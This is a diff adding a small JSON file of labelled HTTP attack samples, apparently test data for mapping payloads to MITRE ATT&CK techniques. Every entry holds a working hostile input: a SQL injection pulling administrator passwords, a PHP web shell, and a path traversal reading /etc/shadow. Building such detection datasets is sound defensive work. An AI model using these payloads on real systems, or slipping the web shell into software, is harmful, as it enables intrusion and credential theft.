@@ -1,0 +1,32 @@
+[
+  {
+    "id": "TC-001",
+    "context": "Method: GET\nPath: /api/v1/users",
+    "payload": "id=1' UNION SELECT NULL, username, password FROM administrators--",
+    "label": {
+      "tid": "T1190",
+      "tactic": "Initial Access",
+      "description": "Exploit Public-Facing Application"
+    }
+  },
+  {
+    "id": "TC-002",
+    "context": "Method: POST\nPath: /wp-content/plugins/vulnerable-plugin/upload.php",
+    "payload": "<?php system($_REQUEST['cmd']); ?>",
+    "label": {
+      "tid": "T1505.003",
+      "tactic": "Persistence",
+      "description": "Server Software Component: Web Shell"
+    }
+  },
+  {
+    "id": "TC-003",
+    "context": "Method: GET\nPath: /download.php",
+    "payload": "file=../../../../../../etc/shadow",
+    "label": {
+      "tid": "T1083",
+      "tactic": "Discovery",
+      "description": "File and Directory Discovery"
+    }
+  }
+]
